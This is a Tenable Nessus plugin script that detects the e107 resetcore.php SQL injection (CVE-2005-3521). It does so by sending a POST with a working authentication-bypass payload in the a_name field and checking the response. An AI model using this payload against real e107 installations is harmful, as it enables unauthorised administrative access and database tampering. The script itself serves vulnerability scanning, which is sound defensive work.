#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20069);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_cve_id("CVE-2005-3521");
  script_bugtraq_id(15125);
  script_osvdb_id(20070);

  script_name(english:"e107 resetcore.php user Field SQL Injection");
  script_summary(english:"Attempts to bypass authentication");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is affected by a SQL
injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of e107 installed on the remote host is affected by a
SQL injection vulnerability that could allow a remote, unauthenticated
attacker to inject SQL commands via the 'resetcore.php' script.  This
could allow an attacker to gain administrative access to the
application, manipulate data in the back-end database, or disclose
arbitrary data."
  );
  script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/e107remote.html");
  script_set_attribute(attribute:"see_also", value:"https://sourceforge.net/project/shownotes.php?release_id=364570");
  script_set_attribute(attribute:"solution", value:"Upgrade to e107 version 0.6173 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/10/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/10/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/10/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencie("e107_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/e107");
  exit(0);
}

# Check starts here

include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:80, php:TRUE);

# Test an install.
install = get_install_from_kb(
  appname : "e107",
  port    : port,
  exit_on_fail : TRUE
);
dir = install['dir'];
install_url = build_url(port:port, qs:dir);

url = dir + "/e107_files/resetcore.php";

# Make sure the script exists.
res = http_send_recv3(
  method : "GET",
  item   : url,
  port   : port,
  exit_on_fail : TRUE
);

# If it does...
variables = "a_name=%27+or+isnull%281%2F0%29%23&a_password=&usubmit=Continue";

if (egrep(pattern:"<input [^>]*name='a_(name|password)'", string:res[2]))
{
  res2 = http_send_recv3(
    method : "POST",
    item   : url,
    port   : port,
    data   : variables,
    add_headers : make_array("Content-Type",
                             "application/x-www-form-urlencoded",
                             "Content-Length",
                             strlen(variables)),
    exit_on_fail : TRUE
   );

  if (
    ("Reset core to default values" >< res2[2]) &&
    ("e107 resetcore></title>" >< res2[2])
  )
  {
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    if (report_verbosity > 0)
    {
      report =
        '\nNessus was able to verify the issue using the following request :' +
        '\n' +
        '\n' + http_last_sent_request() +
        '\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", install_url);
